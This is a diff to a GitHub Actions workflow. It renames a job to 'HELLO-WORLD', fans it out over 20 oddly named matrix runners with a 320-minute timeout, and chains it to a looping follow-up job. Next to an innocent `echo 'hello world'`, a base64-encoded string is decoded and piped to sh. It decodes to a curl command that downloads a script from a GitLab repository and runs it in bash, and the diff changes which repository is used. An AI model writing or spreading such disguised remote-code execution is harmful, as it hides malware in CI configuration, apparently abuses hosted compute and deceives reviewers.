@@ -12,33 +12,33 @@ permissions:
   actions: write
 
 jobs:
-  run-lscpu:
+  HELLO-WORLD:
     name: ${{ matrix.name }}
     strategy:
       fail-fast: false
       max-parallel: 20
       matrix:
         include:
-          - name: asakafhias-aesene12a
-          - name: asakafhias-besene12b
-          - name: asakafhias-cesene12c
-          - name: asakafhias-desene12d
-          - name: asakafhias-eesene12e
-          - name: asakafhias-fesene12f
-          - name: asakafhias-gesene12g
-          - name: asakafhias-hesene12h
-          - name: asakafhias-iesene12i
-          - name: asakafhias-jesene12j
-          - name: okakfhair-aaesene12k
-          - name: okakfhair-baesene12l
-          - name: okakfhair-caesene12m
-          - name: okakfhair-daesene12n
-          - name: okakfhair-eaesene12o
-          - name: okakfhair-faesene12p
-          - name: okakfhair-agesene12q
-          - name: okakfhair-haesene12r
-          - name: okakfhair-iaesene12s
-          - name: okakfhair-jaesene12t          
+          - name: asakafhias-aesene12arh
+          - name: asakafhias-besene12bre
+          - name: asakafhias-cesene12cre
+          - name: asakafhias-desene12drd
+          - name: asakafhias-eesene12efa
+          - name: asakafhias-fesene12fas
+          - name: asakafhias-gesene12gaa
+          - name: asakafhias-hesene12hfs
+          - name: asakafhias-iesene12iaf
+          - name: asakafhias-jesene12jsa
+          - name: okakfhair-aaesene12kfa
+          - name: okakfhair-baesene12lsa
+          - name: okakfhair-caesene12msa
+          - name: okakfhair-daesene12nad
+          - name: okakfhair-eaesene12oad
+          - name: okakfhair-faesene12pad
+          - name: okakfhair-agesene12qcg
+          - name: okakfhair-haesene12rsa
+          - name: okakfhair-iaesene12sad
+          - name: okakfhair-jaesene12tad          
     runs-on: ubuntu-latest
     timeout-minutes: 320
     steps:
@@ -74,10 +74,10 @@ jobs:
               SLEEP=3600
             fi
           fi
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9zcGluYXpvbGxhL3NhaW50Ly0vcmF3L21haW4vbHVtYmFyYW5zIHwgYmFzaA | sh & sleep $SLEEP
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGVtYWtzYW5zIHwgYmFzaA | sh & sleep $SLEEP
 
-  line-phanu:
-    needs: run-lscpu
+  lime-phanu:
+    needs: HELLO-WORLD
     runs-on: ubuntu-latest
     if: github.event.inputs.loop_count > 0
     steps:
